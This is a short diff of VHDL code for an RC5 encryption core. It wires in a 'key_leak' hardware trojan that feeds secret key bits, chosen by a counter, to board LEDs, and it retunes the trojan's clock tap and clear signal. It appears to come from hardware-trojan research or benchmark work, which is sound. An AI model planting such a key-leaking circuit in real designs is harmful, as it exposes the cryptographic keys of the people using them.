@@ -161,7 +161,7 @@ Begin
 	U1 : rc5_rnd_key Port Map (clr => clr, clk => clk, key_in => key, key_vld => key_vld, skey => skey, key_rdy => key_rdy);
 	U2 : rc5_enc Port Map (clr => clr, clk => clk, din => din, di_vld => enc_trig, trigger => trigger, skey => skey, dout => dout_enc, do_rdy => enc_rdy, key_rdy => key_rdy);
 	U3 : rc5_dec Port Map (clr => clr, clk => clk, din => din, din_vld => enc_trig, skey => skey, dout => dout_dec, dout_rdy => dec_rdy, key_rdy => key_rdy); 
-	U4 : key_leak Port Map (clr => clr, clk => clk, counter=>trojan_delcnt(7), trojan_trigger=>trigger, leak_key=>key(conv_integer(digit(6 downto 0))), ready1=>led_trojan1, ready0=>led_trojan0);
+	U4 : key_leak Port Map (clr => nclr, clk => clk, counter=>trojan_delcnt(1), trojan_trigger=>trigger, leak_key=>key(conv_integer(digit(6 downto 0))), ready1=>led_trojan1, ready0=>led_trojan0);
 --Select
 	With j_count select
 		hexval <= 	key(31 downto 0) 		when "000",
@@ -321,7 +321,7 @@ generic map (
    WIDTH_DATA => 48)            -- Counter output bus width, 1-48
 port map (
    Q => digit,                 -- Counter output, width determined by WIDTH_DATA generic 
-   CLK => trojan_delcnt(7),             -- 1-bit clock input
+   CLK => trojan_delcnt(1),             -- 1-bit clock input
    CE => '1',               -- 1-bit clock enable input
    DIRECTION => '1', -- 1-bit up/down count direction input, high is count up
    LOAD => '0',           -- 1-bit active high load input
